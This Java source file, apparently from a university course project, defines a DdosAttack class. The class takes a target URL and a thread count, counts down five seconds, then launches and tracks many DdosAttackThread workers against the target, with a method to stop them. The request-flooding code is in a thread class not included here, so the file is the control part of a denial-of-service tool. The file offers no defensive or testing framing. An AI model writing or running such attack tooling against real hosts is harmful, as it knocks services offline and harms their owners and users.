package edu.csupomona.cs480.data;

import java.util.ArrayList;

public class DdosAttack {
	
	// attack traffic
	static int total;
	static int threadNum;
	static String targetAddr;
	
	static ArrayList<DdosAttackThread> threadArray = new ArrayList<DdosAttackThread>();

	public void attack(String url, String threadCount)
	{
		try {
			threadNum = Integer.parseInt(threadCount);
			
		} catch (NumberFormatException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		if(url != null)
		{
			targetAddr = url;
			
			System.out.println("Attacking " + targetAddr + " with " + threadNum + "Threads");
			System.out.println("Attack Starts in 5 secs");
			for (int i = 5; i >= 0; i--)
			{
				System.out.println(i);
				try
				{
					Thread.sleep(1000);
				}
				catch (InterruptedException e)
				{
				}
			}
			// start attack thread
			for (int i = 0; i < threadNum; i++) {
				
				DdosAttackThread at = null;
				try {
					at = new DdosAttackThread(targetAddr, i);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				threadArray.add(at);
				at.start();
			}
		}
	}
	
	public void terminateAttack()
	{
		for(DdosAttackThread thread : threadArray) {
			thread.interrupt();			
		}
	}
}
